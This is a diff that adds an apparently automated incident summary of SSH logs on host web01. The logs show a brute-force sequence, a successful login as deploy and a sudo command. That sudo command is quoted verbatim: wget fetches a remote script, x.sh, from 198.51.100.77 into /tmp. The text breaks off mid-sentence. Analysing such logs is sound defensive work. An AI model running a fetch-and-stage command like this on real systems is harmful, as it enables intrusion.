@@ -1,0 +1,24 @@
+ 1. SUMMARY: Multiple failed SSH login attempts were made from IP address 203.0.113.45, targeting various invalid and valid users, followed by a successful login for user deploy. A sudo command was executed by the logged-in user deploy.
+
+2. EVIDENCE:
+   - Multiple failed SSH login attempts:
+     - Oct 14 02:11:03 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2
+     - Oct 14 02:11:05 web01 sshd[2213]: Failed password for invalid user test from 203.0.113.45 port 51124 ssh2
+     - Oct 14 02:11:07 web01 sshd[2215]: Failed password for root from 203.0.113.45 port 51126 ssh2
+     - Oct 14 02:11:09 web01 sshd[2217]: Failed password for root from 203.0.113.45 port 51128 ssh2
+     - Oct 14 02:11:12 web01 sshd[2219]: Failed password for invalid user ubuntu from 203.0.113.45 port 51130 ssh2
+     - Oct 14 02:11:15 web01 sshd[2221]: Failed password for deploy from 203.0.113.45 port 51132 ssh2
+     - Oct 14 02:11:18 web01 sshd[2223]: Failed password for deploy from 203.0.113.45 port 51134 ssh2
+   - Successful SSH login for user deploy: Oct 14 02:12:01 web01 sshd[2230]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
+   - sudo command execution by user deploy: Oct 14 02:13:44 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/x.sh -O /tmp/x.sh
+
+3. SUSPICIOUS ACTIVITY:
+   - Multiple failed login attempts for various users could indicate a brute-force attack.
+   - Successful login for user deploy followed by a sudo command execution is suspicious, as it may indicate unauthorized access or privilege escalation.
+
+4. ASSUMPTIONS:
+   - The IP address 203.0.113.45 is an external IP address (as it is not a local host or internal IP address).
+   - The user deploy has sudo privileges (as evidenced by the sudo command execution).
+
+5. MISSING INFORMATION:
+   - The purpose of
